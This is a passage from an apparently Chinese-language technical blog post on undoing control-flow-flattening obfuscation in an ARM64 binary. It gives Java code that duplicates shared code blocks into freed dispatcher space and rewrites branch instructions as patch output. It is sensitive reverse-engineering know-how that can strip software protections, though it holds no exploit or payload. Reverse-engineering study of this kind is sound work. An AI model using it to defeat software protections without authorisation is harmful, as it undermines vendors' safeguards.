254);">if</span> (block.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress() == mergedNode.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress()) {                    mergedNodes.remove(block);<br />                    <span style="color: rgb(150, 203, 254);">break</span>;                }        mergedNodes.add(mergedNode);<br />        <span style="color: rgb(150, 203, 254);">if</span> (toMap.get(ins.getAddress()) != <span style="color: rgb(198, 197, 254);">null</span>) {<br />            <span style="color: rgb(150, 203, 254);">for</span> (Instruction i : toMap.get(ins.getAddress())) {<br />                <span style="color: rgb(150, 203, 254);">if</span> (!accessed.contains(i.getAddress())) {                    pending.push(i);                    accessed.add(i.getAddress());                }            }        }    }<br />    <span style="color: rgb(150, 203, 254);">if</span> (!isFirst) {<br />        <span style="color: rgb(150, 203, 254);">for</span> (Link link : graphLinkMap) {<br />            <span style="color: rgb(255, 255, 182);">MutableNode</span> <span style="color: rgb(198, 197, 254);">node</span> = graphNodeMap.get(link.address);            node.addLink(link.node);        }    }<br />}</code></pre><h2>7. 输出 patch 信息</h2><p>到了最重要的 patch 环节，在反混淆控制流平坦化的文章中，真实块只有一个，patch的过程其实相对简单，这个样本中会比较复杂，主要原因是存在共用块，导致不能直接进行 patch</p><p>所以除了获取真实块合集之间的联系之外，最重要的是处理 commonBlock，它每多触发一次，就需要多复制一份出来。可以复制到哪呢？控制流平坦化 patch 的时候，会将所有的控制块 patch 为 nop，所以我们能将这些控制块利用起来，复制到控制块即可。</p><blockquote><p style="margin-bottom: 15px;">其实 commonBlock 中的内容不一定重要，但是就怕万一，所以尽可能做到还原</p></blockquote><h3>7.1 patchAll</h3><p>这个是整体patch的方法，和前面获取真实块合集的外层逻辑是差不多的，从合集的start开始遍历，调用 patchInstructionArea 进行真正的 patch，传入了一个 HashMap (patchInfo)，patchInstructionArea 会将 patch 的地址以及 patch 的指令放在这个 HashMap 中</p><p>最后将控制块中未被使用的地址都 patch 成 nop，然后输出信息</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">patchInstructionAll</span>() {<br />    <span style="color: rgb(146, 255, 184);">// 地址和要修改为的指令</span><br />    <span style="color: rgb(146, 255, 184);">// 1. 旧跳转指令的patch</span><br />    <span style="color: rgb(146, 255, 184);">// 2. commonBlock的复制</span><br />    <span style="color: rgb(146, 255, 184);">// 所以用过的 controlNode 地址是会在这里面保存的</span><br />    Map&lt;Long, String&gt; patchInfo = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HashMap</span>&lt;&gt;();    patchInstructionArea(patchInfo, entry, to -&gt; {<br />            <span style="color: rgb(150, 203, 254);">for</span> (List&lt;Instruction&gt; block : controlNodes)<br />                <span style="color: rgb(150, 203, 254);">if</span> (block.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress() == to.getAddress())<br />                    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">true</span>;<br />            <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">false</span>;        });<br />    <span style="color: rgb(150, 203, 254);">for</span> (List&lt;Instruction&gt; block : realNodes) {<br />        List&lt;Instruction&gt; from = fromMap.get(block.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress());<br />        <span style="color: rgb(150, 203, 254);">if</span> (from == <span style="color: rgb(198, 197, 254);">null</span>) {<br />            <span style="color: rgb(150, 203, 254);">continue</span>;        }<br />        <span style="color: rgb(150, 203, 254);">for</span> (Instruction ins : from) {<br />            <span style="color: rgb(146, 255, 184);">// 如果from block是控制块，那么就算是area start，才进行后续的处理</span>            List&lt;Instruction&gt; lastBlock = getMergeNodeByEnd(ins.getAddress());<br />            <span style="color: rgb(150, 203, 254);">if</span> (!controlNodes.contains(lastBlock)) {<br />                <span style="color: rgb(150, 203, 254);">continue</span>;            }<br />            patchInstructionArea(patchInfo, block.get(<span style="color: rgb(255, 115, 253);">0</span>), to -&gt; preDispather.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress() == to.getAddress());        }    }<br />    <span style="color: rgb(150, 203, 254);">for</span> (List&lt;Instruction&gt; block : controlNodes)<br />        <span style="color: rgb(150, 203, 254);">for</span> (Instruction ins : block)<br />            <span style="color: rgb(150, 203, 254);">if</span> (!patchInfo.containsKey(ins.getAddress() - moduleBase))<br />                patchInfo.put(ins.getAddress() - moduleBase, <span style="color: rgb(168, 255, 96);">"nop"</span>);<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">long</span> key : patchInfo.keySet())<br />        System.out.println(<span style="color: rgb(168, 255, 96);">"patch: ["</span> + Long.toHexString(key) + <span style="color: rgb(168, 255, 96);">"] "</span> + patchInfo.get(key));<br />}</code></pre><h3>7.2 patch 一个真实块合集</h3><p>这个是 patch 的逻辑，后面有三部分空出来了，下面再进行介绍，这里先看以下对真实块合集的遍历，和之前获取真实块合集类似，要遍历合集中的每个真实块</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">private</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">patchInstructionArea</span>(Map&lt;Long, String&gt; patchInfo, Instruction start, OutBlockJudge outBlockJudge) {<br />    <span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">addition</span> = condBlockAreaMap.containsKey(start.getAddress()) ? <span style="color: rgb(255, 115, 253);">1</span> : <span style="color: rgb(255, 115, 253);">0</span>;<br />    Set&lt;Long&gt; area = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HashSet</span>&lt;&gt;();<br />    <span style="color: rgb(146, 255, 184);">// block 原有的到新的映射，在一次area中一个block只会被复制一次</span><br />    Map&lt;Long, Long&gt; copyBlock = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HashMap</span>&lt;&gt;();<br />    Set&lt;Long&gt; accessed = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">HashSet</span>&lt;&gt;();<br />    Stack&lt;Instruction&gt; pending = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">Stack</span>&lt;&gt;();  <span style="color: rgb(146, 255, 184);">// 只存block的首个ins</span>    accessed.add(start.getAddress());    pending.add(start);<br />    <span style="color: rgb(146, 255, 184);">// 遍历整个block area</span><br />    <span style="color: rgb(150, 203, 254);">while</span> (!pending.empty()) {<br />        <span style="color: rgb(255, 255, 182);">Instruction</span> <span style="color: rgb(198, 197, 254);">top</span> = pending.pop();        List&lt;Instruction&gt; b = getMergeNodeByStart(top.getAddress());<br />        <span style="color: rgb(255, 255, 182);">Instruction</span> <span style="color: rgb(198, 197, 254);">lastIns</span> = b.get(b.size() - <span style="color: rgb(255, 115, 253);">1</span>);<br />        <span style="color: rgb(255, 255, 182);">long</span> <span style="color: rgb(198, 197, 254);">lastInsAddress</span> = lastIns.getAddress();        List&lt;Instruction&gt; toList = toMap.get(lastInsAddress);<br />        <span style="color: rgb(150, 203, 254);">for</span> (Instruction i : b)            area.add(i.getAddress());<br />        <span style="color: rgb(150, 203, 254);">if</span> (toList != <span style="color: rgb(198, 197, 254);">null</span>) {<br />            <span style="color: rgb(146, 255, 184);">// [1] 复制 commonBlock</span><br />            <span style="color: rgb(150, 203, 254);">for</span> (Instruction to : toList) {<br />                <span style="color: rgb(146, 255, 184);">// [2] 处理 to 是 commonBlock 的块，会在这里面分配新区域用来复制commonBlock</span><br />                <span style="color: rgb(150, 203, 254);">if</span> (!accessed.contains(to.getAddress()))<br />                    <span style="color: rgb(150, 203, 254);">if</span> (outBlockJudge.isOutBlock(to)) {<br />                        <span style="color: rgb(146, 255, 184);">// [3] 结尾块，这里要 patch 跳转指令，要跳转到下一个真实区块的合集</span><br />                    } <span style="color: rgb(150, 203, 254);">else</span> {                        pending.push(to);                        accessed.add(to.getAddress());                    }            }        }    }<br />}</code></pre><h4>7.2.1 复制 commonBlock</h4><p>这部分相对简单，因为关键逻辑在7.2.2中，这里只是将commonBlock复制到新的区块中。7.2.2中会进行区块的分配，然后将原区块的首地址和新区块的首地址放在 copyBlock 中，所以只要 copyBlock 中有，开始复制就对了，然后将新分配的地址和相应的指令存放在 patchInfo 中</p><p>这里需要注意的是，之前遍历得到的指令，如果有跳转，是加了 module base 的，所以这里将 #0x400 给替掉，这个其实有点风险，可能正常逻辑里面也有这个，暂时做的粗糙一点</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">if</span> (commonBlock.getOrDefault(top.getAddress(), <span style="color: rgb(255, 115, 253);">0</span>) &gt; <span style="color: rgb(255, 115, 253);">1</span> &amp;&amp; copyBlock.containsKey(top.getAddress())) {<br />    <span style="color: rgb(146, 255, 184);">// 遍历到commonBlock，此时copyBlock中已经包含了它的信息</span>    List&lt;Instruction&gt; common = getMergeNodeByStart(top.getAddress());<br />    <span style="color: rgb(255, 255, 182);">long</span> <span style="color: rgb(198, 197, 254);">copyTo</span> = copyBlock.get(top.getAddress());<br />    <span style="color: rgb(255, 255, 182);">long</span> <span style="color: rgb(198, 197, 254);">base</span> = <span style="color: rgb(255, 115, 253);">0</span>;<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">i</span> = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; common.size(); i++, base ++) {<br />        <span style="color: rgb(150, 203, 254);">if</span> (i != <span style="color: rgb(255, 115, 253);">0</span> &amp;&amp; copyBlock.containsKey(common.get(i).getAddress())) {            copyTo = copyBlock.get(common.get(i).getAddress());<br />            base = <span style="color: rgb(255, 115, 253);">0</span>;        }<br />        copyBlock.put(common.get(i).getAddress(), copyTo + base * <span style="color: rgb(255, 115, 253);">4L</span>);<br />        patchInfo.put(copyTo + i * <span style="color: rgb(255, 115, 253);">4L</span> - moduleBase, common.get(i).toString().replaceAll(<span style="color: rgb(168, 255, 96);">"#0x400([0-9a-fA-F]+)"</span>, <span style="color: rgb(168, 255, 96);">"#0x$1"</span>));    }<br />}</code></pre><h4>7.2.2 分配区块用于后续 commonBlock 的复制</h4><blockquote><p style="margin-bottom: 15px;">其实可以走到 commonBlock 时再进行分配，不过写在这里相对方便一些，但是相对麻烦，还得判断 from 是否是当前区块</p></blockquote><p>当碰到下一个区块是 commonBlock 时，就需要分配了。但是有一个例外，就是 commonBlock 是在当前块后面，那么当前块尾部就不是跳转指令，这个就不进行复制，让它保持原状即可。也就是说有一个合集会直接使用 commonBlock，其他合集就要进行复制。</p><p>allocBlock方法分配新的区块，新区块的大小是 commonBlock 的大小加一点额外空间</p><ol><li style="margin-left: 2px;"><p>如果当前真实区块有分支，那么再留一条指令，用于进行条件的跳转</p></li><li style="margin-left: 2px;"><p>如果 commonBlock 是结尾不是分支语句，那么它和下一个块就是直接连接的，那么要留一条分支指令，用于跳转后续块</p></li></ol><p>在分配了新的区块后，将映射信息存放在 copyBlock 中，同时将当前块的最后一个跳转指令进行 patch，使它跳转到新分配的区块</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">addition</span> = condBlockAreaMap.containsKey(start.getAddress()) ? <span style="color: rgb(255, 115, 253);">1</span> : <span style="color: rgb(255, 115, 253);">0</span>;<br /><span style="color: rgb(146, 255, 184);">// ...</span><br /><span style="color: rgb(146, 255, 184);">// commonBlock的格式在前面mergeRealArea判断过了</span><br /><span style="color: rgb(146, 255, 184);">// 如果下个block是commonBlock，并且还不是紧接着的，那么需要复制</span><br /><span style="color: rgb(150, 203, 254);">if</span> (commonBlock.getOrDefault(to.getAddress(), <span style="color: rgb(255, 115, 253);">0</span>) &gt; <span style="color: rgb(255, 115, 253);">1</span> &amp;&amp; copyBlock.getOrDefault(lastInsAddress, lastInsAddress) + <span style="color: rgb(255, 115, 253);">4</span> != to.getAddress()) {    List&lt;Instruction&gt; common = getMergeNodeByStart(to.getAddress());<br />    <span style="color: rgb(146, 255, 184);">// 由于至少要包含一个指令以及一个跳转指令，所以必须</span><br />    <span style="color: rgb(146, 255, 184);">// + 1 是为了避免一些问题（比如common下一个刚好是preDispatcher）</span><br />    <span style="color: rgb(146, 255, 184);">// 或者是连续的两个common块，复制出来之后前一个要加跳转，等等</span><br />    <span style="color: rgb(146, 255, 184);">// 总结是，如果不以b结尾，应该要改，所以要提前预备一个</span><br />    <span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(198, 197, 254);">brAddition</span> = common.get(common.size() - <span style="color: rgb(255, 115, 253);">1</span>).getMnemonic().equals(<span style="color: rgb(168, 255, 96);">"b"</span>) ? <span style="color: rgb(255, 115, 253);">0</span> : <span style="color: rgb(255, 115, 253);">1</span>;<br />    <span style="color: rgb(255, 255, 182);">Instruction</span> <span style="color: rgb(198, 197, 254);">alloc</span> = allocBlock(common, common.size() + addition + brAddition, patchInfo, copyBlock);<br />    <span style="color: rgb(150, 203, 254);">if</span> (alloc == <span style="color: rgb(198, 197, 254);">null</span>)<br />        <span style="color: rgb(150, 203, 254);">throw</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">RuntimeException</span>(<span style="color: rgb(168, 255, 96);">"No enough controlNode "</span> + Long.toHexString(common.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress()));<br />    <span style="color: rgb(150, 203, 254);">else</span> {<br />        <span style="color: rgb(146, 255, 184);">// 连续common块，复制出来，需要patch，会走到这里面，但实际它是不以 b 指令结尾的，这里根据原指令筛除</span><br />        <span style="color: rgb(150, 203, 254);">if</span> (!lastIns.getMnemonic().equals(<span style="color: rgb(168, 255, 96);">"b"</span>) &amp;&amp; lastInsAddress + <span style="color: rgb(255, 115, 253);">4</span> != to.getAddress())<br />            <span style="color: rgb(150, 203, 254);">throw</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">RuntimeException</span>(<span style="color: rgb(168, 255, 96);">"Unexpected last ins"</span> + Long.toHexString(lastInsAddress) + <span style="color: rgb(168, 255, 96);">" "</span> + lastIns);<br />        <span style="color: rgb(146, 255, 184);">// 如果是copy的block，那么patch地址是 copyBlock.get(lastInsAddres)，否则就是lastInsAddress</span><br />        <span style="color: rgb(146, 255, 184);">// 所以用 copyBlock.getOrDefault(lastInsAddress, lastInsAddress) 即可</span><br />        <span style="color: rgb(255, 255, 182);">boolean</span> <span style="color: rgb(198, 197, 254);">needNewIns</span> = !lastIns.getMnemonic().equals(<span style="color: rgb(168, 255, 96);">"b"</span>);<br />        patchInfo.put(copyBlock.getOrDefault(lastInsAddress, lastInsAddress) + (needNewIns ? <span style="color: rgb(255, 115, 253);">4</span> : <span style="color: rgb(255, 115, 253);">0</span>) - moduleBase,<br />                      String.format(<span style="color: rgb(168, 255, 96);">"b %d"</span>, alloc.getAddress() - moduleBase));        copyBlock.put(to.getAddress(), alloc.getAddress());    }<br />}</code></pre><h4>7.2.3 尾块的处理</h4><p>这里先简单说一下之前二次探索存的真实块之间的 link，如果不是keyIns中，那么就代表没有分支，那么直接存在 flowBlockAreaMap 中，如果在keyIns中，有分支，那么就存在 condBlockAreaMap 中，如果 cond 是true，就存在第一个，false就存在第零个</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">public</span> <span style="color: rgb(150, 203, 254);">void</span> <span style="color: rgb(255, 255, 182);">addBlockAreaLink</span>(Instruction ins, Instruction to, <span style="color: rgb(255, 255, 182);">boolean</span> cond) {<br />    <span style="color: rgb(146, 255, 184);">// <span style="color: rgb(255, 255, 182);">TODO:</span> 这里是为了筛除内部循环，但也可能是在控制流平坦化控制下的循环（如果发现 link 的有问题，有缺失，可以处理）</span><br />    <span style="color: rgb(150, 203, 254);">if</span> (ins.getAddress() == to.getAddress()) {<br />        System.out.printf(<span style="color: rgb(168, 255, 96);">"flow block area link error, link self %x -&gt; %x\n"</span>, ins.getAddress(), to.getAddress());<br />        <span style="color: rgb(150, 203, 254);">return</span>;    }<br />    <span style="color: rgb(150, 203, 254);">if</span> (startMapTokeyIns.containsKey(ins.getAddress())) {<br />        <span style="color: rgb(146, 255, 184);">// 从 putLinkToMap 复制上来的，cond的这个有点不一样</span><br />        <span style="color: rgb(255, 255, 182);">long</span> <span style="color: rgb(198, 197, 254);">fromAddress</span> = ins.getAddress();<br />        <span style="color: rgb(150, 203, 254);">if</span> (!condBlockAreaMap.containsKey(fromAddress)) {<br />            List&lt;Instruction&gt; tmp = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ArrayList</span>&lt;&gt;(<span style="color: rgb(255, 115, 253);">2</span>);<br />            tmp.add(<span style="color: rgb(198, 197, 254);">null</span>);<br />            tmp.add(<span style="color: rgb(198, 197, 254);">null</span>);            condBlockAreaMap.put(fromAddress, tmp);        }<br />        condBlockAreaMap.get(fromAddress).set(cond ? <span style="color: rgb(255, 115, 253);">1</span> : <span style="color: rgb(255, 115, 253);">0</span>, to);<br />    } <span style="color: rgb(150, 203, 254);">else</span> {        putLinkToMap(flowBlockAreaMap, ins.getAddress(), to);    }<br />}</code></pre><p>下面开始看尾块的处理逻辑，首先要找到跳转地址，这个无论是不是分支，都是会有一个跳转地址的，condBlockAreaMap中的就取false的那个跳转地址</p><p>然后是针对不同情况需要找不同地址进行 patch，可能是当前块后续的指令，也可能是在复制块中，具体的情况可以看下面的注释</p><p>处理完成一个跳转地址，需要处理有分支情况的另一个跳转地址</p><ul><li style="margin-left: 2px;"><p>首先找到当前区里的keyIns，获取keyIns的条件，即 <code style="font-family: SFMono-Regular, Consolas, ;">csel w10, w11, w10, eq</code> 中的 <code style="font-family: SFMono-Regular, Consolas, ;">eq</code>，这样就可以得到 patch 的指令了，即 <code style="font-family: SFMono-Regular, Consolas, ;">b.{cond} {trueAddr}</code>。这里的 trueAddr 是 condBlockAreaMap 中true的跳转地址</p></li><li style="margin-left: 2px;"><p>从尾部的指令往前遍历，直到找到 keyIns，它们之间的 ins 假如是 <code style="font-family: SFMono-Regular, Consolas, ;">ins-1, keyIns, ins1, ins2, ..., ins-end-1, ins-end</code>，那么需要将它移动位置，修改为 <code style="font-family: SFMono-Regular, Consolas, ;">ins-1, ins1, ins2, ..., ins-end-1, keyIns, ins-end</code>，新的序列中 keyIns 的提防就被 patch 为刚刚的 <code style="font-family: SFMono-Regular, Consolas, ;">b.{cond} {trueAddr}</code></p></li></ul><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">if</span> (outBlockJudge.isOutBlock(to)) {<br />    <span style="color: rgb(146, 255, 184);">// 对于最后一个block，即out block（之前已经判断过一个area只有一个out block）</span><br />    <span style="color: rgb(146, 255, 184);">// 首先对于所有的要进行patch的，要先找到一个用于patch跳转的地址</span><br />    <span style="color: rgb(146, 255, 184);">// 1. 尾部直接存在b指令的，patch这个b即可</span><br />    <span style="color: rgb(146, 255, 184);">// 2. 没有b指令，entry块，而且to是下一条指令，且to是controlBlock，那么以下一条指令作为patch</span><br />    <span style="color: rgb(146, 255, 184);">// 3. 没有b指令，to是下一条指令，且to是preDispatcher，且当前是复制块，那么在尾部的下一条指令patch</span><br />    <span style="color: rgb(146, 255, 184);">// 4. 没有b指令，to是下一条指令，且to是preDispatcher，那么在尾部的下一条指令patch</span><br />    <span style="color: rgb(146, 255, 184);">// 剩下的是对于cond情况的真实块集合来说，需要一直往上找，直到在 startMapTokeyIns，过程中的指令暂存以下，然后开始 patch 这些指令（调整顺序）</span><br />    System.out.println(<span style="color: rgb(168, 255, 96);">"last ins: "</span> + lastIns);<br />    <span style="color: rgb(255, 255, 182);">long</span> <span style="color: rgb(198, 197, 254);">nextAddress</span> = -<span style="color: rgb(255, 115, 253);">1</span>;<br />    <span style="color: rgb(150, 203, 254);">if</span> (flowBlockAreaMap.containsKey(start.getAddress()))<br />        nextAddress = flowBlockAreaMap.get(start.getAddress()).get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress();<br />    <span style="color: rgb(150, 203, 254);">else</span> <span style="color: rgb(150, 203, 254);">if</span> (condBlockAreaMap.containsKey(start.getAddress()))<br />        <span style="color: rgb(146, 255, 184);">// b.{cond} {trueAddr}</span><br />        <span style="color: rgb(146, 255, 184);">// b        {falseAddr}</span><br />        nextAddress = condBlockAreaMap.get(start.getAddress()).get(<span style="color: rgb(255, 115, 253);">0</span>) == <span style="color: rgb(198, 197, 254);">null</span> ? -<span style="color: rgb(255, 115, 253);">1</span> : condBlockAreaMap.get(start.getAddress()).get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress();<br />    <span style="color: rgb(150, 203, 254);">if</span> (nextAddress == -<span style="color: rgb(255, 115, 253);">1</span>)<br />        <span style="color: rgb(146, 255, 184);">// throw new RuntimeException("next address is null " + Long.toHexString(start.getAddress()));</span><br />        <span style="color: rgb(150, 203, 254);">continue</span>;<br />    <span style="color: rgb(255, 255, 182);">String</span> <span style="color: rgb(198, 197, 254);">patchFlowInstruction</span> = String.format(<span style="color: rgb(168, 255, 96);">"b %d"</span>, nextAddress - moduleBase);<br />    <span style="color: rgb(255, 255, 182);">Instruction</span> <span style="color: rgb(198, 197, 254);">willPatchCondInstruction</span> = <span style="color: rgb(198, 197, 254);">null</span>;<br />    <span style="color: rgb(150, 203, 254);">if</span> (lastIns.getMnemonic().equals(<span style="color: rgb(168, 255, 96);">"b"</span>)) {<br />        <span style="color: rgb(146, 255, 184);">// 这里是假定block大小是大于1的，碰到等于1的再想办法处理</span><br />        willPatchCondInstruction = b.get(b.size() - <span style="color: rgb(255, 115, 253);">2</span>);        patchInfo.put(copyBlock.getOrDefault(lastInsAddress, lastInsAddress) - moduleBase, patchFlowInstruction);<br />    } <span style="color: rgb(150, 203, 254);">else</span> <span style="color: rgb(150, 203, 254);">if</span> (start.getAddress() == entry.getAddress()) {<br />        <span style="color: rgb(150, 203, 254);">if</span> (toList.size() == <span style="color: rgb(255, 115, 253);">1</span> &amp;&amp; toList.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress() == lastInsAddress + <span style="color: rgb(255, 115, 253);">4</span>) {            willPatchCondInstruction = lastIns;<br />            patchInfo.put(copyBlock.getOrDefault(toList.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress(), toList.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress()) - moduleBase, patchFlowInstruction);<br />        } <span style="color: rgb(150, 203, 254);">else</span><br />            <span style="color: rgb(150, 203, 254);">throw</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">RuntimeException</span>(<span style="color: rgb(168, 255, 96);">"Unknown entry block area format"</span>);<br />    } <span style="color: rgb(150, 203, 254);">else</span> <span style="color: rgb(150, 203, 254);">if</span> (toList.size() == <span style="color: rgb(255, 115, 253);">1</span> &amp;&amp; toList.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress() == preDispather.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress()) {<br />        <span style="color: rgb(146, 255, 184);">// 如果有复制的话，等后续再处理，这里只记原本的</span>        willPatchCondInstruction = lastIns;<br />        <span style="color: rgb(150, 203, 254);">if</span> (copyBlock.containsKey(top.getAddress())) {<br />            <span style="color: rgb(255, 255, 182);">long</span> <span style="color: rgb(198, 197, 254);">targetPatchAddress</span> = copyBlock.get(top.getAddress()) + b.size() * <span style="color: rgb(255, 115, 253);">4L</span>;            patchInfo.put(targetPatchAddress - moduleBase, patchFlowInstruction);<br />        } <span style="color: rgb(150, 203, 254);">else</span> {<br />            patchInfo.put(preDispather.get(<span style="color: rgb(255, 115, 253);">0</span>).getAddress() - moduleBase, patchFlowInstruction);        }<br />    } <span style="color: rgb(150, 203, 254);">else</span><br />        <span style="color: rgb(150, 203, 254);">throw</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">RuntimeException</span>(<span style="color: rgb(168, 255, 96);">"Unknown block area format "</span> + Long.toHexString(start.getAddress()));<br />    <span style="color: rgb(150, 203, 254);">if</span> (condBlockAreaMap.containsKey(start.getAddress()) &amp;&amp; condBlockAreaMap.get(start.getAddress()).get(<span style="color: rgb(255, 115, 253);">1</span>) != <span style="color: rgb(198, 197, 254);">null</span>) {<br />        List&lt;Instruction&gt; insBetweenKeyInsAndEnd = <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">ArrayList</span>&lt;&gt;();        insBetweenKeyInsAndEnd.add(willPatchCondInstruction);<br />        <span style="color: rgb(150, 203, 254);">while</span> (!startMapTokeyIns.containsValue(insBetweenKeyInsAndEnd.get(insBetweenKeyInsAndEnd.size() - <span style="color: rgb(255, 115, 253);">1</span>).getAddress())) {<br />            <span style="color: rgb(255, 255, 182);">Instruction</span> <span style="color: rgb(198, 197, 254);">cur</span> = insBetweenKeyInsAndEnd.get(insBetweenKeyInsAndEnd.size() - <span style="color: rgb(255, 115, 253);">1</span>);<br />            <span style="color: rgb(150, 203, 254);">if</span> (fromMap.containsKey(cur.getAddress())) {<br />                <span style="color: rgb(146, 255, 184);">//                                        List&lt;Instruction&gt; from = fromMap.get(cur.getAddress());</span><br />                <span style="color: rgb(146, 255, 184);">// 如果是commonBlock，可能存在多个from，所以这里需要筛选一下</span><br />                <span style="color: rgb(255, 255, 182);">Instruction</span> <span style="color: rgb(198, 197, 254);">fromInArea</span> = <span style="color: rgb(198, 197, 254);">null</span>;<br />                <span style="color: rgb(150, 203, 254);">for</span> (Instruction f : fromMap.get(cur.getAddress()))<br />                    <span style="color: rgb(150, 203, 254);">if</span> (area.contains(f.getAddress())) {<br />                        <span style="color: rgb(150, 203, 254);">if</span> (fromInArea == <span style="color: rgb(198, 197, 254);">null</span>)                            fromInArea = f;<br />                        <span style="color: rgb(150, 203, 254);">else</span><br />                            <span style="color: rgb(150, 203, 254);">throw</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">RuntimeException</span>(<span style="color: rgb(168, 255, 96);">"Find block area key ins error (multi from) "</span> + Long.toHexString(cur.getAddress()) + <span style="color: rgb(168, 255, 96);">" "</span> + cur);                    }                insBetweenKeyInsAndEnd.add(fromInArea);<br />            } <span style="color: rgb(150, 203, 254);">else</span><br />                <span style="color: rgb(150, 203, 254);">throw</span> <span style="color: rgb(150, 203, 254);">new</span> <span style="color: rgb(255, 255, 182);">RuntimeException</span>(<span style="color: rgb(168, 255, 96);">"Find block area key ins error (no from) "</span> + Long.toHexString(cur.getAddress()) + <span style="color: rgb(168, 255, 96);">" "</span> + cur);        }<br />        <span style="color: rgb(146, 255, 184);">// end .... ins</span><br />        <span style="color: rgb(146, 255, 184);">// end: b...</span><br />        <span style="color: rgb(255, 255, 182);">long</span> <span style="color: rgb(198, 197, 254);">trueAddress</span> = condBlockAreaMap.get(start.getAddress()).get(<span style="color: rgb(255, 115, 253);">1</span>).getAddress();<br />        <span style="color: rgb(255, 255, 182);">Instruction</span> <span style="color: rgb(198, 197, 254);">keyIns</span> = 